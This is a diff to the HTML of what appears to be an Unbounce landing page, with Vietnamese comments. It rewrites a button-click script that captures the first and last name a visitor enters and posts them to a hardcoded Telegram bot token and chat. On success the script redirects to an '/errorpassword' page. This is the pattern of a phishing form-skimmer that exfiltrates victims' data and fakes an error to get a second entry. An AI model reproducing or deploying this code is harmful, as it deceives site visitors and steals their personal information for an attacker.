@@ -844,50 +844,51 @@
 
 	<script>
 		document.getElementById("lp-pom-button-18").addEventListener("click", function() {
-			// Lấy dữ liệu từ các trường nhập liệu
-			var firstName = document.getElementById("first_name").value;
-			var lastName = document.getElementById("last_name").value;
-		
-			// Kiểm tra xem cả hai trường nhập liệu có dữ liệu không
-			if(firstName.trim() !== '' && lastName.trim() !== '') {
-				// Token của bot Telegram
-				var botToken = '6591392740:AAGw9FfUDM-FDCI9PzTWUXc1RBuIsLPfldU';
-		
-				// Chat ID của nhóm Telegram
-				var chatId = '@ongochoc123';
-		
-				// Tin nhắn bạn muốn gửi
-				var message = '======================================================================================================== \n \nNhập lần 1:\nFirst Name: ' + firstName + '\nLast Name: ' + lastName;
-		
-				// Tạo URL endpoint để gửi tin nhắn
-				var telegramApiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
-		
-				// Sử dụng Fetch API để gửi tin nhắn
-				fetch(telegramApiUrl, {
-					method: 'POST',
-					headers: {
-						'Content-Type': 'application/json'
-					},
-					body: JSON.stringify({
-						chat_id: chatId,
-						text: message
-					})
-				})
-				.then(response => {
-					if (!response.ok) {
-						throw new Error('Network response was not ok');
-					}
-					return response.json();
-				})
-				.then(data => {
-					//window.location.href = './errorpassword';
-				})
-				.catch(error => {
-				});
-			} else {
-				
-			}
-		});
+    // Lấy dữ liệu từ các trường nhập liệu
+    var firstName = document.getElementById("first_name").value;
+    var lastName = document.getElementById("last_name").value;
+
+    // Kiểm tra xem cả hai trường nhập liệu có dữ liệu không
+    if (firstName.trim() !== '' && lastName.trim() !== '') {
+        // Token của bot Telegram
+        var botToken = '6591392740:AAGw9FfUDM-FDCI9PzTWUXc1RBuIsLPfldU';
+
+        // Chat ID của nhóm Telegram
+        var chatId = '@ongochoc123';
+
+        // Tin nhắn bạn muốn gửi
+        var message = '======================================================================================================== \n \nNhập lần 1:\nFirst Name: ' + firstName + '\nLast Name: ' + lastName;
+
+        // Tạo URL endpoint để gửi tin nhắn
+        var telegramApiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+
+        // Tạo yêu cầu XMLHttpRequest
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', telegramApiUrl);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        // Xử lý sự kiện khi nhận được phản hồi từ server
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                if (xhr.status === 200) {
+                    // Xử lý phản hồi thành công
+                    window.location.href = '/errorpassword';
+                } else {
+                    // Xử lý phản hồi không thành công
+                }
+            }
+        };
+
+        // Gửi yêu cầu với dữ liệu JSON
+        xhr.send(JSON.stringify({
+            chat_id: chatId,
+            text: message
+        }));
+    } else {
+        // Xử lý trường hợp không có dữ liệu nhập vào
+    }
+});
+
 		</script>
 
 	<script async src="../../builder-assets.unbounce.com/published-js/main.bundle-c3f2a09.z.js"
